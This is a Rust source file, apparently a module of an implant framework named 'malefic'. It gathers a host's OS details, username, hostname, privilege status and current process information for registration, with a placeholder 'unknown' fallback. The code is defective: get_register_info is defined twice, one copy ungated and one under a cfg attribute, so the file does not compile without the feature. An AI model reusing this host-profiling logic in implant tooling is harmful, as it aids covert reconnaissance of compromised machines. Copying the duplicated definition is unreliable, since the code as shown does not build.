
use malefic_proto::proto::modulepb::{SysInfo, Os, Process};


pub fn get_os() -> Option<Os> {
    let info = malefic_helper::common::sysinfo::default_os().unwrap();
    Some(Os {
        name: info.name,
        version: info.version,
        release: info.release,
        arch: info.arch,
        username: info.username,
        hostname: info.hostname,
        locale: info.locale,
        clr_version: info.clr_version,
    })
}

pub fn get_sysinfo() -> Option<SysInfo> {
    let info = malefic_helper::common::sysinfo::get_sysinfo();
    let os = info.os?;
    let process = info.process?;
    Some(SysInfo {
        filepath: info.filepath,
        workdir: info.workdir,
        is_privilege: info.is_privilege,
        os: Some(Os {
            name: os.name,
            version: os.version,
            release: os.release,
            arch: os.arch,
            username: os.username,
            hostname: os.hostname,
            locale: os.locale,
            clr_version: os.clr_version,
        }),
        process: Some(Process {
            name: process.name,
            pid: process.pid,
            ppid: process.ppid,
            arch: process.arch,
            owner: process.owner,
            path: process.path,
            args: process.args,
            uid: "".to_string(),
        })
    })
}

pub fn none_sysinfo() -> Option<SysInfo> {

    Some(SysInfo {
        filepath: "unknown".to_string(),
        workdir: "".to_string(),
        is_privilege: false,
        os: Some(Os {
            name: "unknown".to_string(),
            version: "unknown".to_string(),
            release: "unknown".to_string(),
            arch: "unknown".to_string(),
            username: "unknown".to_string(),
            hostname: "unknown".to_string(),
            locale: "unknown".to_string(),
            clr_version: vec![],
        }),
        process: Some(Process {
            name: "unknown".to_string(),
            pid: 9999,
            ppid: 9999,
            arch: "unknown".to_string(),
            owner: "unknown".to_string(),
            path: "unknown".to_string(),
            args: "unknown".to_string(),
            uid: "".to_string(),
        })
    })
}

pub fn get_register_info() -> Option<SysInfo> {
    if cfg!(feature = "register_info") {
        get_sysinfo()
    } else {
        none_sysinfo()
    }
}


#[cfg(not(feature = "register_info"))]
pub fn get_register_info() -> Option<SysInfo> {
    None
}